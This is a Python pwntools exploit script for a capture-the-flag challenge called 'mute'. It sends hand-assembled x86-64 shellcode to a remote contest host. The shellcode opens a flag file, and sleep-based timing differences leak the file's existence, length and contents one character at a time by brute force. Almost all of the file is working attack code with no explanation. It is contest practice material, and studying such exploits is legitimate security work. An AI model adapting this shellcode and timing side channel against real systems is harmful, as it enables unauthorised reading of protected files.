#!/usr/bin/env python
from pwn import *
from datetime import datetime
import struct
import string

def is_path_valid(path):
    shellcode = "\x49\x89\xD7\x48\xC7\xC0\x02\x00\x00\x00\x4C\x89\xFF\x48\x81\xC7\x00\x04\x00\x00\x48\x31\xF6\x0F\x05\x83\xF8\x00\x7C\x01\xC3\x48\xC7\xC2\xB8\x0B\x00\x00\xE8\x01\x00\x00\x00\xC3\x55\x48\x89\xE5\x48\xC7\xC0\x07\x00\x00\x00\x48\x31\xFF\x48\x31\xF6\x0F\x05\x48\x89\xEC\x5D\xC3"
    pad1 = 'A' * (0x400 - len(shellcode))
    path = path + '\x00'
    pad2 = 'B' * (0x100 - len(path))
    str = 'test\x00'
    pad3 = 'C' * (0x1000 - 0x500 - len(str))
    final = shellcode + pad1 + path + pad2 + str + pad3

    conn = remote('mute_9c1e11b344369be9b6ae0caeec20feb8.quals.shallweplayaga.me', 443)
    conn.send(final)

    start_time = datetime.now()
    while True:
        try:
            print conn.recv()
        except EOFError:
            break
    conn.close()
    print ''

    finish_time = datetime.now()
    sec = (finish_time - start_time).seconds

    if 3 <= sec:
        return False
    else:
        return True


def get_file_length(path):
    shellcode = "\x49\x89\xD7\x48\xC7\xC0\x02\x00\x00\x00\x4C\x89\xFF\x48\x81\xC7\x00\x04\x00\x00\x48\x31\xF6\x0F\x05\x83\xF8\x00\x7C\x02\xEB\x1A\xEB\x4D\x55\x48\x89\xE5\x48\xC7\xC0\x07\x00\x00\x00\x48\x31\xFF\x48\x31\xF6\x0F\x05\x48\x89\xEC\x5D\xC3\x4D\x31\xF6\x41\x89\xC6\x48\xC7\xC0\x05\x00\x00\x00\x48\x31\xFF\x44\x89\xF7\x4C\x89\xFE\x48\x81\xC6\x00\x05\x00\x00\x0F\x05\x48\x8B\x46\x30\x49\xC7\xC5\xE8\x03\x00\x00\x49\xF7\xE5\x48\x89\xC2\xE8\xB3\xFF\xFF\xFF\xC3"
    pad1 = 'A' * (0x400 - len(shellcode))
    path = path + '\x00'
    pad2 = 'B' * (0x1000 - 0x400 - len(path))
    final = shellcode + pad1 + path + pad2

    f = open("code", "w")
    f.write(final)
    f.close()

    conn = remote('mute_9c1e11b344369be9b6ae0caeec20feb8.quals.shallweplayaga.me', 443)
    conn.send(final)

    start_time = datetime.now()
    while True:
        try:
            print conn.recv()
        except EOFError:
            break
    conn.close()
    print ''

    finish_time = datetime.now()
    return (finish_time - start_time).seconds


def check_flag_length(path):
    shellcode = "\x49\x89\xD7\x48\xC7\xC0\x02\x00\x00\x00\x4C\x89\xFF\x48\x81\xC7\x00\x04\x00\x00\x48\x31\xF6\x0F\x05\x83\xF8\x00\x7C\x02\xEB\x1A\xEB\x50\x55\x48\x89\xE5\x48\xC7\xC0\x07\x00\x00\x00\x48\x31\xFF\x48\x31\xF6\x0F\x05\x48\x89\xEC\x5D\xC3\x4D\x31\xF6\x41\x89\xC6\x48\xC7\xC0\x00\x00\x00\x00\x48\x31\xFF\x44\x89\xF7\x4C\x89\xFE\x48\x81\xC6\x00\x04\x00\x00\x48\xC7\xC2\x72\x00\x00\x00\x0F\x05\x48\x83\xF8\x72\x75\x0C\x48\xC7\xC2\x88\x13\x00\x00\xE8\xB0\xFF\xFF\xFF\xC3"
    pad1 = 'A' * (0x400 - len(shellcode))
    path = path + '\x00'
    pad2 = 'B' * (0x1000 - 0x400 - len(path))
    final = shellcode + pad1 + path + pad2

    f = open("code", "w")
    f.write(final)
    f.close()

    conn = remote('mute_9c1e11b344369be9b6ae0caeec20feb8.quals.shallweplayaga.me', 443)
    conn.send(final)

    start_time = datetime.now()
    while True:
        try:
            print conn.recv()
        except EOFError:
            break
    conn.close()
    print ''

    finish_time = datetime.now()
    # subtract 1 because of RTT
    return (finish_time - start_time).seconds - 1


def read_flag(path, idx, ch):
    shellcode = "\x6A{0}\x49\x89\xD7\x48\xC7\xC0\x02\x00\x00\x00\x4C\x89\xFF\x48\x81\xC7\x00\x04\x00\x00\x48\x31\xF6\x0F\x05\x83\xF8\x00\x7C\x02\xEB\x1A\xEB\x61\x55\x48\x89\xE5\x48\xC7\xC0\x07\x00\x00\x00\x48\x31\xFF\x48\x31\xF6\x0F\x05\x48\x89\xEC\x5D\xC3\x4D\x31\xF6\x41\x89\xC6\x48\xC7\xC0\x00\x00\x00\x00\x48\x31\xFF\x44\x89\xF7\x4C\x89\xFE\x48\x81\xC6\x00\x04\x00\x00\x48\xC7\xC2\x72\x00\x00\x00\x0F\x05\x59\x48\x8B\x04\x0E\x3C{1}\x75\x19\x48\xC7\xC0\x05\x00\x00\x00\x49\xC7\xC5\xE8\x03\x00\x00\x49\xF7\xE5\x48\x89\xC2\xE8\xA0\xFF\xFF\xFF\x90\xC3".format(struct.pack("<B", idx), struct.pack("<B", ch))
    #print shellcode.encode('hex')
    pad1 = 'A' * (0x400 - len(shellcode))
    path = path + '\x00'
    pad2 = 'B' * (0x1000 - 0x400 - len(path))
    final = shellcode + pad1 + path + pad2

    f = open("code", "w")
    f.write(final)
    f.close()

    conn = remote('mute_9c1e11b344369be9b6ae0caeec20feb8.quals.shallweplayaga.me', 443)
    conn.send(final)

    start_time = datetime.now()
    while True:
        try:
            print conn.recv()
        except EOFError:
            break
    conn.close()
    print ''

    finish_time = datetime.now()
    # subtract 1 because of RTT
    return (finish_time - start_time).seconds - 1


def main():
    path = '/home/mute/flag'
    # path = '/home/vm/Build/ctf/mute/flag'
    valid = is_path_valid(path)
    if valid:
        print "[o] {0}\n".format(path)
    else:
        print "[x] {0}\n".format(path)
        exit(0)

    # size = get_file_length(path)
    # print "Length = {0}".format(size)
    # returned 115 -> real size is 114

    
    flag = list()
    for i in range(0, 200):
        binary = ""
        table = "0123456789abcdefghijklmnopqrstuvwxyz ABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c"
        for j in table:
            ch = read_flag(path, i, ord(j))
            #flag.append(ch)
            print "[{}]".format(j), ''.join(flag), ch
            if ch >= 3:
                flag.append(j)
                break
        print ''.join(flag)

if __name__ == '__main__':
    main()


